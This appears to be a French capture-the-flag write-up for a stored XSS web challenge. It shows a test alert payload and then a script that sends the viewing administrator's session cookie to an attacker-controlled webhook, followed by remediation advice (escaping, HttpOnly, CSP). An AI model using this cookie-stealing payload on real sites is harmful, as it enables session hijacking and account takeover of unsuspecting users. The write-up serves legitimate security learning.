# XSS - Stored 1

## Infos

- Catégorie : Web - Client
- Difficulté / Points :
- Fichiers / URL fournis : page avec un champ dont le contenu est stocké et réaffiché

## Énoncé

*(à compléter)*

## TL;DR

Le champ est vulnérable à une **XSS stockée** : mon payload est enregistré puis exécuté quand quelqu'un ouvre la page. Comme c'est l'administrateur qui la consulte, j'utilise la XSS pour envoyer son cookie de session vers un serveur que je contrôle (**session hijacking**).

## Reconnaissance

Je teste un payload simple pour voir si le champ est vulnérable :

```html
<script>alert(document.cookie)</script>
```

Ça m'affiche mon propre cookie. J'en déduis que le script est bien exécuté, mais sur **ma** session. Pour récupérer quelque chose d'utile, il faut que ce soit **l'administrateur** qui exécute le payload en ouvrant la page.

## Exploitation

Je prépare un service en ligne pour recevoir les données (type `webhook.site`), puis j'injecte un payload qui envoie le cookie de celui qui ouvre la page vers ce service :

```html
<script>fetch("https://mon-webhook/log?cookie=" + document.cookie)</script>
```

Quand l'administrateur consulte la page, son navigateur exécute le script et son cookie de session arrive sur mon webhook.

## Flag

`masqué` *(règles Root-Me)* — le cookie admin récupéré n'est pas publié.

## Ce que j'ai appris

- Une **XSS stockée** est plus dangereuse qu'une XSS réfléchie : le payload est enregistré côté serveur et touche tous ceux qui ouvrent la page.
- Avec `document.cookie` et un `fetch`, on peut exfiltrer la session d'une autre personne (**session hijacking**), à condition que le cookie n'ait pas l'attribut `HttpOnly`.
- Pour corriger : échapper les entrées à l'affichage, mettre les cookies de session en `HttpOnly`, et appliquer une politique `Content-Security-Policy`.
